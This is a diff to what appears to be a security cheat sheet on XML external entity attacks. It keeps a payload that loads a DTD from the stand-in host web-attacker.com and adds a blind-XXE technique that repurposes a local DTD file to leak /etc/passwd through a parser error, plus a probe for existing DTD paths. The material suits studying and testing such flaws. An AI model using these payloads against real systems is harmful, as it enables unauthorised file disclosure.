@@ -144,3 +144,27 @@ XXE payload to the vulnerable application:
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
 "http://web-attacker.com/malicious.dtd"> %xxe;]>
 ```
+
+### Exploiting blind XXE by repurposing a local DTD
+if out-of-band interactions are blocked, invoke a DTD file that happens to exist on the local filesystem and repurpose it to redefine an existing entity in a way that triggers a parsing error containing sensitive data:
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+Locating an existing DTD file to repurpose:
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+test a list of common DTD files to locate a file that is present
+
